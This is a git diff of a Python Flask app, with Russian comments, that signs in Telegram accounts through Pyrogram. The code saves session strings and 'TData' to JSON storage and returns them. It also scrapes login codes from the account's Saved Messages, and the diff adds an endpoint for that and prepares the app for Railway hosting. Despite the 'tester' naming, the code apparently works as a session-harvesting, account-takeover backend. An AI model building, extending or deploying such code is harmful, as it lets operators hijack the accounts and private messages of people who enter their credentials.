@@ -16,8 +16,11 @@ from pyrogram.errors import (
     FloodWait
 )
 
-# Настройка логирования
-logging.basicConfig(level=logging.INFO)
+# Настройка логирования для Railway
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__, 
@@ -29,82 +32,78 @@ app = Flask(__name__,
 def serve_static(filename):
     return send_from_directory('templates', filename)
 
-# КЛАСС ДЛЯ ПОИСКА КОДА TELEGRAM
+# 🔧 УЛУЧШЕННЫЙ КЛАСС ДЛЯ RAILWAY
 class TelegramCodeFinder:
     def __init__(self, session_string):
-        self.client = Client("code_finder", session_string=session_string)
+        # Используем уникальное имя для избежания конфликтов
+        session_name = f"railway_finder_{int(time.time())}"
+        self.client = Client(
+            session_name, 
+            session_string=session_string,
+            in_memory=True
+        )
     
     async def find_telegram_code(self):
-        """Поиск кода подтверждения от Telegram"""
+        """Поиск кода подтверждения от Telegram с улучшенной обработкой ошибок"""
         try:
             async with self.client:
-                logger.info("🔍 Поиск кода подтверждения в Telegram...")
+                logger.info("🔍 Запуск поиска кода на Railway...")
                 
                 codes_found = []
                 
-                # Ищем в последних сообщениях
-                async for message in self.client.get_chat_history('me', limit=50):
-                    if message.text and self._is_telegram_code_message(message.text):
-                        code = self._extract_code(message.text)
-                        if code:
-                            codes_found.append({
-                                'code': code,
-                                'text': message.text,
-                                'date': message.date,
-                                'from': getattr(message.from_user, 'first_name', 'Telegram') 
-                                if message.from_user else 'Telegram'
-                            })
-                            logger.info(f"✅ Найден код: {code}")
+                # 🔧 УПРОЩЕННЫЙ ПОИСК ТОЛЬКО В SAVED MESSAGES
+                try:
+                    async for message in self.client.get_chat_history('me', limit=30):
+                        if message.text:
+                            # Простой поиск любых 5 цифр
+                            codes = re.findall(r'\b\d{5}\b', message.text)
+                            if codes:
+                                code = codes[0]
+                                codes_found.append({
+                                    'code': code,
+                                    'text': message.text[:100],
+                                    'date': message.date.isoformat() if message.date else None,
+                                    'from': 'Telegram'
+                                })
+                                logger.info(f"✅ Найден код: {code}")
+                                break  # Нашли код - выходим
+                except Exception as e:
+                    logger.warning(f"⚠️ Ошибка при поиске в saved messages: {e}")
                 
                 return codes_found
                 
         except Exception as e:
-            logger.error(f"❌ Ошибка поиска кода: {e}")
+            logger.error(f"❌ Критическая ошибка поиска: {e}")
             return None
-    
-    def _is_telegram_code_message(self, text):
-        """Проверяем, является ли сообщение кодом от Telegram"""
-        telegram_keywords = [
-            'код', 'code', 'Login code', 'Ваш код', 'confirmation',
-            'подтверждени', 'sign in', 'authorization'
-        ]
-        return any(keyword.lower() in text.lower() for keyword in telegram_keywords)
-    
-    def _extract_code(self, text):
-        """Извлекаем код из текста сообщения"""
-        # Ищем 5-значный код
-        code_match = re.search(r'\b\d{5}\b', text)
-        if code_match:
-            return code_match.group()
-        
-        # Ищем код в формате "12345"
-        code_match = re.search(r'[Cc]ode[\s:]*(\d{5})', text, re.IGNORECASE)
-        if code_match:
-            return code_match.group(1)
-        
-        return None
 
-# Функция для поиска и отображения кода Telegram
-async def find_and_display_telegram_code(session_string):
-    """Найти и показать код Telegram после авторизации"""
-    finder = TelegramCodeFinder(session_string)
-    codes = await finder.find_telegram_code()
-    
-    if codes:
-        latest_code = codes[0]  # Берем самый свежий код
+# 🔧 УПРОЩЕННАЯ ФУНКЦИЯ ПОИСКА
+async def find_telegram_code_simple(session_string):
+    """Упрощенный поиск кода для Railway"""
+    try:
+        finder = TelegramCodeFinder(session_string)
+        codes = await finder.find_telegram_code()
+        
+        if codes:
+            return {
+                'success': True,
+                'code_found': True,
+                'telegram_code': codes[0]['code'],
+                'message': f"✅ Код найден: {codes[0]['code']}",
+                'debug': f"Проверено сообщений: 30"
+            }
+        else:
+            return {
+                'success': True,
+                'code_found': False,
+                'telegram_code': None,
+                'message': "❌ Код не найден в последних 30 сообщениях",
+                'debug': "Ищите вручную в чате 'Telegram'"
+            }
+    except Exception as e:
+        logger.error(f"❌ Ошибка упрощенного поиска: {e}")
         return {
-            'success': True,
-            'code_found': True,
-            'telegram_code': latest_code['code'],
-            'message': f"✅ Код Telegram найден: {latest_code['code']}",
-            'full_info': latest_code
-        }
-    else:
-        return {
-            'success': True,
-            'code_found': False,
-            'message': "❌ Код Telegram не найден в последних сообщениях",
-            'telegram_code': None
+            'success': False,
+            'error': f'Ошибка поиска: {str(e)}'
         }
 
 class JSONStorageManager:
@@ -233,8 +232,9 @@ class AsyncRunner:
         self.loop.run_forever()
     
     def run_coroutine(self, coro):
+        # 🔧 УВЕЛИЧИВАЕМ ТАЙМАУТ ДЛЯ RAILWAY
         future = asyncio.run_coroutine_threadsafe(coro, self.loop)
-        return future.result(timeout=30)
+        return future.result(timeout=60)
 
 async_runner = AsyncRunner()
 
@@ -338,7 +338,7 @@ class TelegramAuthTester:
                 'phone': phone_number,
                 'phone_code_hash': sent_code.phone_code_hash,
                 'created_at': time.time(),
-                'needs_password': False  # Добавляем флаг для 2FA
+                'needs_password': False
             }
             
             logger.info(f"📱 Код отправлен. Session: {session_id}")
@@ -561,14 +561,17 @@ class TelegramAuthTester:
             
                 logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                 
-                # 🔍 ДОБАВЛЯЕМ АВТОМАТИЧЕСКИЙ ПОИСК КОДА
-                logger.info("🔍 Запуск автоматического поиска кода Telegram...")
-                code_search_result = await find_and_display_telegram_code(session_string)
-                
-                if code_search_result and code_search_result['code_found']:
-                    logger.info(f"✅ Автоматически найден код: {code_search_result['telegram_code']}")
-                else:
-                    logger.info("❌ Код не найден при автоматическом поиске")
+                # 🔧 ЗАПУСКАЕМ УПРОЩЕННЫЙ ПОИСК ДЛЯ RAILWAY
+                logger.info("🔍 Запуск упрощенного поиска кода на Railway...")
+                try:
+                    code_search_result = await find_telegram_code_simple(session_string)
+                    if code_search_result['success'] and code_search_result['code_found']:
+                        logger.info(f"✅ Найден код: {code_search_result['telegram_code']}")
+                    else:
+                        logger.info("❌ Код не найден")
+                except Exception as e:
+                    logger.warning(f"⚠️ Поиск кода завершился с ошибкой: {e}")
+                    code_search_result = {'success': False, 'error': str(e)}
             
                 return {
                     'success': True,
@@ -576,7 +579,7 @@ class TelegramAuthTester:
                     'tdata_id': tdata_id,
                     'user_id': user_info['id'],
                     'session_string': session_string,
-                    'message': 'TData успешно экспортирован в JSON хранилище',
+                    'message': 'Аутентификация успешна!',
                     'code_search_result': code_search_result
                 }
             else:
@@ -588,7 +591,17 @@ class TelegramAuthTester:
 
 auth_tester = TelegramAuthTester()
 
-# ДОБАВЛЯЕМ НОВЫЙ API ENDPOINT ДЛЯ ПОИСКА КОДА TELEGRAM
+# 🔧 ДОБАВИМ HEALTH CHECK ДЛЯ RAILWAY
+@app.route('/health')
+def health_check():
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': datetime.now().isoformat(),
+        'environment': os.getenv('RAILWAY_ENVIRONMENT', 'development'),
+        'active_sessions': len(ACTIVE_SESSIONS)
+    })
+
+# 🔧 ОБНОВЛЯЕМ API ENDPOINT ДЛЯ RAILWAY
 @app.route('/api/find-telegram-code', methods=['POST', 'OPTIONS'])
 def find_telegram_code():
     if request.method == 'OPTIONS':
@@ -604,13 +617,22 @@ def find_telegram_code():
         if not session_string:
             return jsonify({'success': False, 'error': 'Session string required'}), 400
         
-        # Запускаем поиск кода
-        result = async_runner.run_coroutine(find_and_display_telegram_code(session_string))
+        # 🔧 ИСПОЛЬЗУЕМ УПРОЩЕННУЮ ВЕРСИЮ ДЛЯ RAILWAY
+        result = async_runner.run_coroutine(find_telegram_code_simple(session_string))
         return jsonify(result)
         
+    except asyncio.TimeoutError:
+        logger.error("⏰ Таймаут поиска кода на Railway")
+        return jsonify({
+            'success': False, 
+            'error': 'Таймаут поиска. Попробуйте позже.'
+        }), 408
     except Exception as e:
-        logger.error(f"❌ Ошибка поиска кода: {e}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
+        logger.error(f"❌ Ошибка поиска кода на Railway: {e}")
+        return jsonify({
+            'success': False, 
+            'error': f'Server error: {str(e)}'
+        }), 500
 
 @app.route('/')
 def home():
@@ -707,5 +729,15 @@ def storage_stats():
         return jsonify({'success': False, 'error': str(e)}), 500
 
 if __name__ == '__main__':
+    port = int(os.getenv('PORT', 8080))
+    host = '0.0.0.0'
+    
+    logger.info(f"🚀 Запуск приложения на {host}:{port}")
+    logger.info(f"🌍 Railway Environment: {os.getenv('RAILWAY_ENVIRONMENT', 'Not set')}")
+    
     os.makedirs('templates', exist_ok=True)
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    
+    # 🔧 НАСТРОЙКИ ДЛЯ PRODUCTION
+    debug = os.getenv('DEBUG', 'false').lower() == 'true'
+    
+    app.run(host=host, port=port, debug=debug)
